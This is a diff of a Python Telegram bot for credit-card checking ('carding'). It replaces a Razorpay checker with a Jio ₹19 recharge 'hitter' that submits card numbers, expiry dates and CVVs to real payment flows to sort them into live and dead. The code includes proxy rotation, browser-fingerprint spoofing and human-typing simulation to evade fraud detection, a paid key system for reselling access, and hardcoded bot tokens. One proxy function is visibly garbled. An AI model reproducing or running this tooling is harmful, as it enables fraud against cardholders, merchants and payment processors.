@@ -1,668 +1,653 @@
-import asyncio
-import json
-import time
-import re
-import random
-import hashlib
-import uuid
-import logging
-import os
+"""
+H4 x Chk — Jio ₹19 Hitter (Single File Edition)
+Owner: @whoh4rsh
+Includes: Telegram bot + DB + Patchright stealth + Live logs + Advanced UI
+"""
+import asyncio, json, time, random, uuid, logging, os, sqlite3
+from datetime import datetime
 from threading import Thread
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
 import uvicorn
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (ApplicationBuilder, ContextTypes, MessageHandler,
+    CommandHandler, CallbackQueryHandler, filters)
+from patchright.async_api import async_playwright, TimeoutError as PWTimeout
 
-from curl_cffi.requests import AsyncSession
+# ═══════════════════════════════════════════════════════════
+# CONFIG
+# ═══════════════════════════════════════════════════════════
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8031306974:AAE2ibW3rH57WRjuLCmgEyTZeraArjjROoc")
+OWNER_ID = int(os.getenv("OWNER_ID", "7077294261"))
+OWNER_HANDLE = "@whoh4rsh"
+BOT_NAME = "H4 x Chk"
+BOT_LIFETIME_DAYS = 30
+BOT_BORN = time.time()
+DB_PATH = "h4xchk.db"
 
-from telegram import Update
-from telegram.ext import (
-    ApplicationBuilder,
-    ContextTypes,
-    MessageHandler,
-    CommandHandler,
-    filters
-)
+PLAN_PRICE = 19
+PLAN_ID = "19"
 
-TELEGRAM_BOT_TOKEN = "8031306974:AAFUlWwpvWDSeFDM3pjvDDv0_vo2l95wk5U"
+JIO_RECHARGE_URL = "https://www.jio.com/selfcare/recharge/mobility/"
+NAV_TIMEOUT = 45_000
+JUSPAY_TIMEOUT = 30_000
 
-# Default Working Proxies Preloaded
 RAW_PROXIES = [
+    "in-free-proxy.g-w.info:59783",
     "px241104.pointtoserver.com:10780",
     "px400501.pointtoserver.com:10780",
     "px023005.pointtoserver.com:10780",
     "px051003.pointtoserver.com:10780",
     "px040805.pointtoserver.com:10780",
-    "px040805.pointtoserver.com:10780"
 ]
-
-PROXY_FAIL_COUNTS = {}
-MAX_PROXY_FAILS = 3
-
-RAZORPAY_URLS = [
-    "https://razorpay.me/@onsiteteams",
-    "https://razorpay.me/@getitservice",
-    "https://pages.razorpay.com/payonline",
-    "https://razorpay.me/@plp",
-    "https://axiseasypay.razorpay.com/wallets/"
-]
-
 proxy_index = 0
-url_index = 0
+
+UA_POOL = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+]
+
+VIEWPORTS = [
+    {"width": 1920, "height": 1080},
+    {"width": 1536, "height": 864},
+    {"width": 1440, "height": 900},
+    {"width": 1366, "height": 768},
+]
+
+STEALTH_JS = """
+Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+delete Object.getPrototypeOf(navigator).webdriver;
+window.chrome = {runtime: {}, loadTimes: function() {}, csi: function() {}, app: {isInstalled: false}};
+Object.defineProperty(navigator, 'plugins', {get: () => [
+    {name: 'PDF Viewer', filename: 'internal-pdf-viewer'},
+    {name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer'},
+    {name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer'},
+]});
+Object.defineProperty(navigator, 'mimeTypes', {get: () => [{type: 'application/pdf'}, {type: 'text/pdf'}]});
+Object.defineProperty(navigator, 'languages', {get: () => ['en-IN', 'en-US', 'en']});
+Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
+Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
+Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 0});
+const getParameter = WebGLRenderingContext.prototype.getParameter;
+WebGLRenderingContext.prototype.getParameter = function(p) {
+    if (p === 37445) return 'Intel Inc.';
+    if (p === 37446) return 'Intel Iris OpenGL Engine';
+    return getParameter.call(this, p);
+};
+const originalQuery = window.navigator.permissions.query;
+window.navigator.permissions.query = (parameters) => (
+    parameters.name === 'notifications'
+        ? Promise.resolve({state: Notification.permission})
+        : originalQuery(parameters)
+);
+Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {get: function() { return window; }});
+Object.defineProperty(Notification, 'permission', {get: () => 'default'});
+delete window.__playwright; delete window.__pw_manual; delete window.__PW_inspect;
+delete window._puppeteer_; delete window._selenium; delete window.callPhantom;
+delete window._phantom; delete window.__nightmare;
+const nativeToString = Function.prototype.toString;
+Function.prototype.toString = function() {
+    if (this === Function.prototype.toString) return 'function toString() { [native code] }';
+    return nativeToString.call(this);
+};
+Date.prototype.getTimezoneOffset = function() { return -330; };
+if (navigator.getBattery) {
+    navigator.getBattery = () => Promise.resolve({charging: true, chargingTime: 0, dischargingTime: Infinity, level: 1});
+}
+"""
 
 logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
-logger = logging.getLogger(__name__)
+logger = logging.getLogger("h4xchk")
+api_app = FastAPI(title="H4 x Chk API", version="15.0")
 
-api_app = FastAPI(title="Razorpay CC Checker API", version="21.0")
+# ═══════════════════════════════════════════════════════════
+# DB
+# ═══════════════════════════════════════════════════════════
+def db_init():
+    con = sqlite3.connect(DB_PATH); cur = con.cursor()
+    cur.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT,
+        first_seen INTEGER, banned INTEGER DEFAULT 0, role TEXT DEFAULT 'user',
+        live_checks INTEGER DEFAULT 0, lifetime INTEGER DEFAULT 0)""")
+    cur.execute("""CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, days INTEGER,
+        max_uses INTEGER, used_count INTEGER DEFAULT 0, created_at INTEGER, expires_at INTEGER,
+        created_by INTEGER, bound_to INTEGER DEFAULT 0, cc_limit INTEGER DEFAULT 50)""")
+    cur.execute("""CREATE TABLE IF NOT EXISTS redemptions (user_id INTEGER PRIMARY KEY,
+        key TEXT, activated INTEGER, expires_at INTEGER, cc_used INTEGER DEFAULT 0, cc_limit INTEGER DEFAULT 50)""")
+    cur.execute("""CREATE TABLE IF NOT EXISTS feedback (id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER, username TEXT, message TEXT, created_at INTEGER)""")
+    cur.execute("""CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY CHECK (id=1),
+        total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
+        jio_checks INTEGER DEFAULT 0, otp_count INTEGER DEFAULT 0)""")
+    cur.execute("INSERT OR IGNORE INTO stats (id) VALUES (1)")
+    con.commit(); con.close()
 
-class CardRequest(BaseModel):
-    cc: str
-    mm: str
-    yy: str
-    cvv: str
-    amount: int = 1
+def db(): return sqlite3.connect(DB_PATH)
 
-@api_app.get("/")
-async def root():
-    return {"status": "Bot is active and running 24/7!", "active_proxies": len(RAW_PROXIES)}
+def ensure_user(uid, un=""):
+    con = db(); cur = con.cursor()
+    cur.execute("SELECT user_id FROM users WHERE user_id=?", (uid,))
+    if not cur.fetchone():
+        cur.execute("INSERT INTO users (user_id,username,first_seen,role) VALUES (?,?,?,?)",
+            (uid, un or "", int(time.time()), "owner" if uid==OWNER_ID else "user"))
+    elif un:
+        cur.execute("UPDATE users SET username=? WHERE user_id=?", (un, uid))
+    con.commit(); con.close()
 
-def format_proxy(raw):
-    if not raw: 
-        return None
-    
-    raw = raw.strip().replace('"', '').replace("'", "").replace("\r", "")
-    if not raw: 
-        return None
+def get_user(uid):
+    con = db(); cur = con.cursor()
+    cur.execute("SELECT user_id,username,first_seen,banned,role,live_checks,lifetime FROM users WHERE user_id=?", (uid,))
+    r = cur.fetchone(); con.close()
+    if not r: return None
+    return {"user_id":r[0],"username":r[1],"first_seen":r[2],"banned":r[3],"role":r[4],"live_checks":r[5],"lifetime":r[6]}
 
-    if "://" in raw:
-        return raw
+def is_owner(uid): return uid == OWNER_ID
+def is_admin(uid):
+    u = get_user(uid); return bool(u and u["role"] in ("owner","admin"))
+def is_banned(uid):
+    u = get_user(uid); return bool(u and u["banned"])
 
-    parts = raw.split(":")
-    if len(parts) == 4:
-        if parts[1].isdigit() and int(parts[1]) < 65536:
-            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-        elif parts[3].isdigit() and int(parts[3]) < 65536:
-            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
-        else:
-            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-    elif len(parts) == 2:
-        return f"http://{raw}"
-    
-    return f"http://{raw}"
+def get_active_key(uid):
+    con = db(); cur = con.cursor()
+    cur.execute("SELECT key,activated,expires_at,cc_used,cc_limit FROM redemptions WHERE user_id=?", (uid,))
+    r = cur.fetchone(); con.close()
+    if not r: return None
+    k,a,e,cu,cl = r
+    if not a or e < int(time.time()): return None
+    return {"key":k,"expires_at":e,"cc_used":cu,"cc_limit":cl}
 
-async def test_proxy(raw_proxy):
-    formatted = format_proxy(raw_proxy)
-    if not formatted:
-        return False, "Invalid proxy format"
-    try:
-        async with AsyncSession(impersonate="chrome120") as session:
-            resp = await session.get("https://razorpay.me/@onsiteteams", proxy=formatted, timeout=12)
-            if resp.status_code in [200, 301, 302, 403]:
-                return True, "Proxy is Live & Reachable"
-    except Exception as e:
-        return False, str(e)[:40]
-    return False, "Connection timeout or refused"
+def key_days_left(uid):
+    k = get_active_key(uid); return 0 if not k else max(0,(k["expires_at"]-int(time.time()))//86400)
+def cc_limit_left(uid):
+    k = get_active_key(uid); return 0 if not k else max(0, k["cc_limit"]-k["cc_used"])
+def has_access(uid):
+    if is_owner(uid) or is_admin(uid): return True
+    return get_active_key(uid) is not None
 
-def get_rotating_url():
-    global url_index
-    u = RAZORPAY_URLS[url_index % len(RAZORPAY_URLS)]
-    url_index += 1
-    return u
+def consume_cc(uid):
+    if is_owner(uid) or is_admin(uid): return True
+    k = get_active_key(uid)
+    if not k: return False
+    if k["cc_used"] >= k["cc_limit"]: return False
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE redemptions SET cc_used=cc_used+1 WHERE user_id=?", (uid,))
+    con.commit(); con.close(); return True
 
-def extract_embedded_json(text):
-    tag = "var data ="
-    pos = text.find(tag)
-    if pos != -1:
-        start = pos + len(tag)
-        while start < len(text) and text[start] in [' ', '\t', '\n', '\r']: start += 1
-        if start < len(text) and text[start] == '{':
-            depth, in_str, escaped = 0, False, False
-            for i in range(start, len(text)):
-                c = text[i]
-                if escaped: escaped = False; continue
-                if c == '\\' and in_str: escaped = type(not escaped) and False; continue
-                if c == '"': in_str = not in_str; continue
-                if in_str: continue
-                if c == '{': depth += 1
-                elif c == '}':
-                    depth -= 1
-                    if depth == 0: return text[start:i+1]
+def refund_cc(uid):
+    if is_owner(uid) or is_admin(uid): return
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE redemptions SET cc_used=cc_used-1 WHERE user_id=? AND cc_used>0", (uid,))
+    con.commit(); con.close()
 
-    key_match = re.search(r'["\']key_id["\']\s*:\s*["\'](rzp_live_[a-zA-Z0-9]+)["\']', text)
-    link_match = re.search(r'["\']id["\']\s*:\s*["\'](plink_[a-zA-Z0-9]+)["\']', text)
-    item_match = re.search(r'["\']payment_page_item_id["\']\s*:\s*["\'](ppgi_[a-zA-Z0-9]+)["\']', text)
-    
-    if key_match:
-        simulated_json = {
-            "key_id": key_match.group(1),
-            "payment_link": {
-                "id": link_match.group(1) if link_match else "plink_dummy",
-                "payment_page_items": [{"id": item_match.group(1) if item_match else "ppgi_dummy"}]
-            },
-            "keyless_header": ""
-        }
-        return json.dumps(simulated_json)
+def bump_live(uid):
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE users SET live_checks=live_checks+1, lifetime=lifetime+1 WHERE user_id=?", (uid,))
+    cur.execute("UPDATE stats SET total_checks=total_checks+1, jio_checks=jio_checks+1 WHERE id=1")
+    con.commit(); con.close()
 
+def bump_hit():
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE stats SET total_hits=total_hits+1 WHERE id=1")
+    con.commit(); con.close()
+
+def bump_otp():
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE stats SET otp_count=otp_count+1 WHERE id=1")
+    con.commit(); con.close()
+
+def reset_live(uid):
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE users SET live_checks=0 WHERE user_id=?", (uid,)); con.commit(); con.close()
+def reset_cc(uid):
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE redemptions SET cc_used=0 WHERE user_id=?", (uid,)); con.commit(); con.close()
+def set_cc_limit(uid, limit):
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE redemptions SET cc_limit=? WHERE user_id=?", (limit, uid)); con.commit(); con.close()
+def bot_days_left(): return max(0, BOT_LIFETIME_DAYS - (time.time()-BOT_BORN)//86400)
+
+def gen_key(days, uses, cc_limit, by):
+    raw = f"H4X-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
+    con = db(); cur = con.cursor()
+    cur.execute("INSERT INTO keys (key,days,max_uses,created_at,expires_at,created_by,cc_limit) VALUES (?,?,?,?,?,?,?)",
+        (raw,days,uses,int(time.time()),int(time.time())+days*86400,by,cc_limit))
+    con.commit(); con.close(); return raw
+
+def redeem_key(uid, key):
+    con = db(); cur = con.cursor()
+    cur.execute("SELECT key,days,max_uses,used_count,expires_at,bound_to,cc_limit FROM keys WHERE key=?", (key,))
+    r = cur.fetchone()
+    if not r: con.close(); return False, "❌ Invalid key."
+    k,d,mu,uc,exp,bt,cl = r
+    if uc >= mu: con.close(); return False, "❌ Key maxed."
+    if exp < int(time.time()): con.close(); return False, "❌ Key expired."
+    if bt and bt != uid: con.close(); return False, "❌ Bound."
+    ne = int(time.time())+d*86400
+    cur.execute("INSERT OR REPLACE INTO redemptions (user_id,key,activated,expires_at,cc_used,cc_limit) VALUES (?,?,?,?,?,?)",
+        (uid,key,1,ne,0,cl))
+    cur.execute("UPDATE keys SET used_count=used_count+1, bound_to=? WHERE key=?", (uid,key))
+    con.commit(); con.close()
+    return True, f"✅ Key redeemed · {d}d · {cl} CC limit."
+
+# ═══════════════════════════════════════════════════════════
+# PROXY
+# ═══════════════════════════════════════════════════════════
+def fmt_proxy(raw):
+    raw = raw.strip()
+    if not raw: return None
+    if "://" in raw: return raw
+    p = raw.split(":")
+    if len(p) == 4: return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
+    elif len(p) == 2: return f"http://{raw}"
     return None
 
-async def fetch_dynamic_builds(session, proxy_url):
-    try:
-        resp = await session.get(
-            "https://api.razorpay.com/v1/checkout/public?traffic_env=production&checkout_v2=1",
-            proxy=proxy_url,
-            impersonate="chrome120",
-            timeout=20
-        )
-        text = resp.text
-        build_match = re.search(r'build[\'"]?\s*[:=]\s*[\'"]([a-fA-F0-9]{32,})[\'"]', text)
-        build_v1_match = re.search(r'build_v1[\'"]?\s*[:=]\s*[\'"]([a-fA-F0-9]{32,})[\'"]', text)
-        return (
-            build_match.group(1) if build_match else "9cb57fdf457e44eac4384e182f925070ff5488d9",
-            build_v1_match.group(1) if build_v1_match else "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
-        )
-    except Exception:
-        return "9cb57fdf457e44eac4384e182f925070ff5488d9", "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
-
-async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_callback=None):
+def get_proxy():
     global proxy_index
-    if not RAW_PROXIES:
-        return {"status": "error", "response": "No proxies added! Use /proxy first.", "proxy": "NONE"}
+1    if not RAW_PROXIES: return None
+    p
+ = RAW   _PROXIES[proxy_index % len(RAW_PROXIES)]; proxy_index +=  return fmt_proxy(p)
 
-    phone = "+91" + random.choice(["6", "7", "8", "9"]) + "".join([str(random.randint(0, 9)) for _ in range(9)])
-    email = f"user_{random.randint(1000,9999)}@gmail.com"
+def _parse_proxy_cfg(proxy):
+    if not proxy: return None
+    if "@" in proxy:
+        scheme, rest = proxy.split("://", 1) if "://" in proxy else ("http", proxy)
+        auth, hostport = rest.split("@", 1)
+        user, pwd = auth.split(":", 1)
+        return {"server": f"{scheme}://{hostport}", "username": user, "password": pwd}
+    return {"server": proxy}
 
-    yy_formatted = yy[2:] if len(yy) == 4 else yy
-    try:
-        year = int("20" + yy_formatted)
-    except:
-        year = 2030
-        
-    amount_paise = amount * 100
+# ═══════════════════════════════════════════════════════════
+# PLAYWRIGHT ENGINE
+# ═══════════════════════════════════════════════════════════
+async def _human_delay(min_ms=400, max_ms=1200):
+    await asyncio.sleep(random.uniform(min_ms, max_ms) / 1000)
 
-    device_id = f"1.{hashlib.sha1(uuid.uuid4().bytes).hexdigest()}.{int(time.time()*1000)}.{random.randint(0,99999999):08d}"
-    session_id = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=14))
+async def _human_type(locator, text):
+    await locator.click()
+    await asyncio.sleep(random.uniform(0.1, 0.3))
+    for ch in text:
+        await locator.type(ch, delay=random.randint(40, 180))
+    await asyncio.sleep(random.uniform(0.2, 0.5))
 
-    async def notify(proxy_st, api_st, gw_resp):
-        if status_callback:
-            await status_callback(proxy_st, api_st, gw_resp)
+async def jio19_playwright(cc, mm, yy, cvv, mobile="", proxy=None,
+                            headless=True, log_cb=None):
+    start = time.time()
+    yy_f = yy[2:] if len(yy) == 4 else yy
+    result = {
+        "status": "error", "response": "INIT", "code": "PW-000",
+        "time": "0.00s", "card": f"{cc}|{mm}|{yy}|{cvv}",
+        "AMOUNT": "Rs 19", "PLAN": "19", "NUMBER": mobile or "",
+        "proxy": proxy or "direct", "gate": "Jio19-PW",
+    }
+    if not mobile:
+        mobile = f"9{random.randint(100000000, 999999999)}"
 
-    active_pool = [p for p in RAW_PROXIES if PROXY_FAIL_COUNTS.get(p, 0) < MAX_PROXY_FAILS]
-    if not active_pool:
-        PROXY_FAIL_COUNTS.clear()
-        active_pool = RAW_PROXIES
+    async def _log(msg, emoji="⏳"):
+        if log_cb:
+            try: await log_cb(msg, emoji, f"{(time.time()-start):.1f}s")
+            except Exception: pass
 
-    max_attempts = min(len(active_pool), 3)
-    
-    for _ in range(max_attempts):
-        # Strict Sequential Round-Robin Proxy Rotation
-        current_raw_proxy = active_pool[proxy_index % len(active_pool)]
-        proxy_index += 1
-        
-        current_proxy = format_proxy(current_raw_proxy)
-        if not current_proxy:
-            continue
-
-        proxy_short = current_raw_proxy.split("@")[-1].split(":")[0] if current_raw_proxy else "PROXY"
-        target_url = get_rotating_url()
-        site_name = target_url.split("//")[-1].split("/")[0][:15]
-
-        try:
-            await notify(f"({proxy_short})", f"🌐 Hit: {site_name}", "Connecting...")
-            
-            async with AsyncSession(impersonate="chrome120") as session:
-                
-                async def proxy_request(method, url, **kwargs):
-                    return await session.request(method, url, proxy=current_proxy, timeout=20, **kwargs)
-
-                await proxy_request("GET", target_url)
-                await asyncio.sleep(0.2)
-
-                resp = await proxy_request("GET", target_url)
-                if resp.status_code != 200:
-                    raise Exception(f"HTTP {resp.status_code}")
-                
-                html_body = resp.text
-                config_json = extract_embedded_json(html_body)
-                if not config_json:
-                    raise Exception("Config JSON not found")
-
-                parsed = json.loads(config_json)
-                key_id = parsed.get("key_id")
-                if not key_id:
-                    raise Exception("Key ID missing")
-
-                link_id, item_id = "", ""
-                for k in ["payment_link", "payment_page"]:
-                    if k in parsed and isinstance(parsed[k], dict):
-                        link_id = parsed[k].get("id")
-                        items = parsed[k].get("payment_page_items", [])
-                        if items: item_id = items[0].get("id")
-                        break
-
-                if not link_id:
-                    raise Exception("Link ID missing")
-
-                await notify(f"({proxy_short})", "📦 Parsed JSON", "Creating Order...")
-                keyless_hdr = parsed.get("keyless_header", "")
-
-                BUILD, BUILD_V1 = await fetch_dynamic_builds(session, current_proxy)
-
-                order_payload = {
-                    "notes": {"comment": "", "name": "User"},
-                    "line_items": [{"payment_page_item_id": item_id, "amount": amount_paise}]
-                }
-                order_resp = await proxy_request(
-                    "POST", f"https://api.razorpay.com/v1/payment_pages/{link_id}/order",
-                    json=order_payload,
-                    headers={"Origin": "https://pages.razorpay.com", "Referer": "https://pages.razorpay.com/"}
-                )
-                order_res = order_resp.json()
-
-                order_obj = order_res.get("order", {})
-                order_id = order_obj.get("id")
-                if not order_id:
-                    raise Exception("Order creation failed")
-
-                checkout_ref = order_id.split("_")[1] if "_" in order_id else order_id
-                currency = order_obj.get("currency", "INR")
-
-                await notify(f"({proxy_short})", "🛒 Order Created", "Getting Token...")
-
-                token_params = {
-                    "traffic_env": "production", "build": BUILD, "build_v1": BUILD_V1,
-                    "checkout_v2": "1", "new_session": "1", "keyless_header": keyless_hdr,
-                    "rzp_device_id": device_id, "unified_session_id": session_id
-                }
-                token_resp = await proxy_request("GET", "https://api.razorpay.com/v1/checkout/public", params=token_params)
-                public_text = token_resp.text
-
-                token_match = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', public_text, re.IGNORECASE)
-                if not token_match: token_match = re.search(r'window\.session_token="([^"]+)"', public_text)
-                if not token_match:
-                    raise Exception("Session token missing")
-                
-                session_token = token_match.group(1)
-                referer_url = f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={session_id}&session_token={session_token}"
-
-                await notify(f"({proxy_short})", "🔑 Token Got", "Submitting CC...")
-
-                form_data = {
-                    "notes[comment]": "", "notes[email]": email, "notes[phone]": phone[3:], "notes[name]": "User",
-                    "payment_link_id": link_id, "key_id": key_id, "contact": phone, "email": email,
-                    "currency": currency, "_[integration]": "payment_pages", "_[checkout_id]": checkout_ref,
-                    "_[device.id]": device_id, "_[library]": "checkoutjs", "_[platform]": "browser",
-                    "amount": str(amount_paise), "order_id": order_id, "method": "card",
-                    "card[number]": cc, "card[cvv]": cvv, "card[name]": "User",
-                    "card[expiry_month]": mm, "card[expiry_year]": str(year), "save": "0", "dcc_currency": currency
-                }
-
-                ajax_headers = {
-                    "Origin": "https://api.razorpay.com", "Referer": referer_url,
-                    "x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded"
-                }
-
-                pay_resp = await proxy_request(
-                    "POST", f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id={order_id}&session_token={session_token}&keyless_header={keyless_hdr}",
-                    data=form_data, headers=ajax_headers
-                )
-                payment_res = pay_resp.json()
-
-                PROXY_FAIL_COUNTS[current_raw_proxy] = 0
-
-                payment_id = payment_res.get("payment_id") or payment_res.get("id")
-                if not payment_id:
-                    err_block = payment_res.get("error", {})
-                    err_desc = err_block.get("description", "Declined")
-                    err_reason = err_block.get("reason", "")
-                    reason_full = f"{err_desc} ({err_reason})" if err_reason else err_desc
-                    
-                    desc_lower = err_desc.lower()
-                    if any(k in desc_lower for k in ["insufficient account balance", "insufficient funds", "limit"]) or "incorrect_cvv" in err_reason.lower():
-                        await notify(f"({proxy_short})", "⚡ Gateway", f"Approved: {reason_full}")
-                        return {"status": "approved", "response": reason_full, "proxy": proxy_short}
-                    
-                    await notify(f"({proxy_short})", "⚡ Gateway", f"Declined: {reason_full}")
-                    return {"status": "declined", "response": reason_full, "proxy": proxy_short}
-
-                await notify(f"({proxy_short})", "⚡ Gateway", "Charged Successfully!")
-                return {"status": "charged", "response": "Payment Successful", "proxy": proxy_short}
-
-        except Exception as e:
-            PROXY_FAIL_COUNTS[current_raw_proxy] = PROXY_FAIL_COUNTS.get(current_raw_proxy, 0) + 1
-            logger.warning(f"⚠️ Proxy {proxy_short} failed: {str(e)[:35]}. Switching proxy...")
-            await asyncio.sleep(0.4)
-            continue
-
-    return {"status": "error", "response": "All proxy attempts timed out or failed", "proxy": "PROXY"}
-
-@api_app.post("/api/check")
-async def api_check(req: CardRequest):
-    return await process_card_pipeline_with_logs(req.cc, req.mm, req.yy, req.cvv, req.amount)
-
-# --- TELEGRAM COMMANDS ---
-
-async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "⚡ **Razorpay UHQ CC Checker Bot is Online!**\n\n"
-        "• Send a `.txt` file with `/msa` or drop a single card to start checking.\n"
-        "• Use `/proxy` to add single proxy or `/proxyadd` for bulk proxies.",
-        parse_mode="Markdown"
-    )
-
-async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text(
-            "⚡ **Proxy Manager Menu**\n\n"
-            "⚡ `/proxy host:port:user:pass` (Test & Add Single Proxy)\n"
-            "⚡ `/proxyadd` (Bulk Add Proxies line-by-line)\n"
-            "⚡ `/myproxy` (View Active Proxies)\n"
-            "⚡ `/rmproxy <number>` (Remove Proxy)",
-            parse_mode="Markdown"
-        )
-        return
-    
-    raw_input = context.args[0].strip()
-    status_msg = await update.message.reply_text("🔍 Testing proxy live connectivity with Razorpay...")
-    
-    success, info = await test_proxy(raw_input)
-    if success:
-        if raw_input not in RAW_PROXIES:
-            RAW_PROXIES.append(raw_input)
-        await status_msg.edit_text(
-            f"✅ **Proxy Verified & Added Successfully!**\n"
-            f"▸ Proxy: `{raw_input}`\n"
-            f"▸ Status: `{info}`\n"
-            f"▸ Total Active Proxies: {len(RAW_PROXIES)}",
-            parse_mode="Markdown"
-        )
-    else:
-        await status_msg.edit_text(
-            f"❌ **Proxy Test Failed (Dead Proxy)!**\n"
-            f"▸ Reason: `{info}`\n"
-            f"▸ Proxy was NOT added.",
-            parse_mode="Markdown"
-        )
-
-async def proxyadd_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text
-    lines = text.splitlines()
-    
-    proxy_lines = [l.strip() for l in lines[1:] if l.strip()]
-    if not proxy_lines and context.args:
-        proxy_lines = [arg.strip() for arg in context.args if arg.strip()]
-
-    if not proxy_lines:
-        await update.message.reply_text(
-            "⚠️ **Bulk Proxy Add Usage:**\n\n"
-            "Type `/proxyadd` and paste your proxies line-by-line like this:\n\n"
-            "`/proxyadd`\n"
-            "`host1:port:user:pass`\n"
-            "`host2:port:user:pass`\n"
-            "`host3:port:user:pass`",
-            parse_mode="Markdown"
-        )
-        return
-
-    status_msg = await update.message.reply_text(f"🔍 Testing {len(proxy_lines)} proxies live against Razorpay... Please wait.")
-    
-    added_count = 0
-    failed_count = 0
-    results_log = []
-
-    async def test_and_add(p):
-        nonlocal added_count, failed_count
-        success, info = await test_proxy(p)
-        if success:
-            if p not in RAW_PROXIES:
-                RAW_PROXIES.append(p)
-            added_count += 1
-            results_log.append(f"✅ `{p}`")
-        else:
-            failed_count += 1
-            results_log.append(f"❌ `{p}` (Dead)")
-
-    tasks = [test_and_add(p) for p in proxy_lines]
-    await asyncio.gather(*tasks)
-
-    summary = (
-        f"📊 **Bulk Proxy Add Report:**\n\n"
-        f"✅ Added Successfully (Live): {added_count}\n"
-        f"❌ Dead / Failed: {failed_count}\n"
-        f"🛡️ Total Active Proxies: {len(RAW_PROXIES)}\n\n"
-        f"**Results Preview:**\n" + "\n".join(results_log[:15])
-    )
-    if len(results_log) > 15:
-        summary += f"\n*(and {len(results_log) - 15} more...)*"
-
-    await status_msg.edit_text(summary, parse_mode="Markdown")
-
-async def myproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not RAW_PROXIES:
-        await update.message.reply_text("⚠️ No active proxies saved yet. Use `/proxy` or `/proxyadd` to add them.", parse_mode="Markdown")
-        return
-    
-    text = f"🌐 **Your Proxies ({len(RAW_PROXIES)})**\n\n"
-    for idx, p in enumerate(RAW_PROXIES, 1):
-        text += f"{idx}. `{p}`\n"
-    await update.message.reply_text(text, parse_mode="Markdown")
-
-async def rmproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not RAW_PROXIES:
-        await update.message.reply_text("⚠️ No proxies to remove.", parse_mode="Markdown")
-        return
-    
-    if not context.args:
-        text = "⚠️ **Usage:** `/rmproxy <number>`\n\nActive Proxies:\n"
-        for idx, p in enumerate(RAW_PROXIES, 1):
-            text += f"{idx}. `{p}`\n"
-        await update.message.reply_text(text, parse_mode="Markdown")
-        return
-    
-    try:
-        idx = int(context.args[0]) - 1
-        if 0 <= idx < len(RAW_PROXIES):
-            removed = RAW_PROXIES.pop(idx)
-            await update.message.reply_text(f"🗑️ Successfully removed proxy:\n`{removed}`\nRemaining Proxies: {len(RAW_PROXIES)}", parse_mode="Markdown")
-        else:
-            await update.message.reply_text("⚠️ Invalid proxy number.", parse_mode="Markdown")
-    except ValueError:
-        await update.message.reply_text("⚠️ Please provide a valid number. Example: `/rmproxy 1`", parse_mode="Markdown")
-
-def format_time(sec):
-    m, s = divmod(sec, 60)
-    return f"{m}m {s}s" if m > 0 else f"{s}s"
-
-async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not RAW_PROXIES:
-        await update.message.reply_text("⚠️ Please add at least one proxy first using `/proxy` or `/proxyadd`!", parse_mode="Markdown")
-        return
-
-    doc = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
-    if not doc:
-        await update.message.reply_text("⚠️ Please send or reply to a `.txt` file with `/msa`.")
-        return
-
-    status_msg = await update.message.reply_text("📂 Initializing Persistent Console...")
